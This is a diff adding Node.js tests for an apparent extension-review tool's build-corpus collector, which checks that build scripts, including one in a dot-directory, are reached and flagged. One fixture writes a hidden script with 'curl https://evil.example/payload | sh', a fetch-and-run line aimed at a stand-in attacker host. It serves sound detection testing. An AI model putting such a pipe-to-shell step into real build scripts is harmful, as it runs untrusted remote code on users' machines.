@@ -6,8 +6,12 @@
 
 import { test } from "node:test";
 import assert from "node:assert/strict";
+import fs from "node:fs";
+import os from "node:os";
+import path from "node:path";
 
 import { selectBuildCorpus } from "../../src/build/corpus.js";
+import { loadAddon, scaViews } from "../../src/addon/load.js";
 
 const build = (obj) => ({
   files: new Map(Object.entries(obj).map(([k, v]) => [k, Buffer.from(v)])),
@@ -166,4 +170,84 @@ test("a missing referenced file is silently ignored", () => {
   );
   assert.equal(r.unresolved.length, 0);
   assert.deepEqual(r.corpus, ["package.json"]);
+});
+
+// Over the REAL view rather than a hand-built map, because the thing under test is what the
+// partition makes reachable. A build step is a build step wherever it is filed: this one
+// lives in a dot-directory and pipes a remote payload into sh, and the collector has to
+// both reach it and say it could not bound it - `unresolved` is what names the step in the
+// manual instructions undeclared-build-source hands the reviewer.
+test("a build step in a dot-directory is collected and flagged", () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-dotstep-"));
+  const w = (p, c) => {
+    fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true });
+    fs.writeFileSync(path.join(root, p), c);
+  };
+  w("manifest.json", "{}");
+  w(
+    "package.json",
+    JSON.stringify({
+      name: "x",
+      version: "1.0.0",
+      scripts: { build: "sh .scripts/helper.sh && sh tools/plain.sh" },
+    })
+  );
+  w(".scripts/helper.sh", "curl https://evil.example/payload | sh\n");
+  w("tools/plain.sh", "echo hi\n");
+
+  const archive = scaViews(
+    loadAddon(root, undefined, { recordInstalledTrees: true }),
+    { scaRoot: root }
+  );
+  const view = { files: archive.sca };
+  const { corpus, unresolved } = selectBuildCorpus(view);
+
+  assert.deepEqual(corpus.sort(), [
+    ".scripts/helper.sh",
+    "package.json",
+    "tools/plain.sh",
+  ]);
+  assert.deepEqual(unresolved, [
+    { kind: "network", detail: ".scripts/helper.sh" },
+  ]);
+
+  fs.rmSync(root, { recursive: true, force: true });
+});
+
+// The manifest is a build input like any other - a pack step copies it into the output -
+// and the build half has to be able to reach it. It is withheld from the REVIEW SOURCE,
+// where a pre-build manifest must not be read as the shipped one, and that is a fact about
+// that corpus rather than about the archive.
+test("a build step that copies the manifest collects it", () => {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), "wrr-packmf-"));
+  const w = (p, c) => {
+    fs.mkdirSync(path.dirname(path.join(root, p)), { recursive: true });
+    fs.writeFileSync(path.join(root, p), c);
+  };
+  w("manifest.json", '{"manifest_version":3,"name":"x","version":"1"}');
+  w(
+    "package.json",
+    JSON.stringify({
+      name: "x",
+      version: "1.0.0",
+      scripts: { build: "sh tools/pack.sh" },
+    })
+  );
+  w("tools/pack.sh", "cp manifest.json dist/\ncp icons/logo.png dist/\n");
+  w("icons/logo.png", "png");
+
+  const archive = scaViews(
+    loadAddon(root, undefined, { recordInstalledTrees: true }),
+    { scaRoot: root }
+  );
+  const view = { files: archive.sca };
+
+  assert.deepEqual(selectBuildCorpus(view).corpus.sort(), [
+    "icons/logo.png",
+    "manifest.json",
+    "package.json",
+    "tools/pack.sh",
+  ]);
+
+  fs.rmSync(root, { recursive: true, force: true });
 });
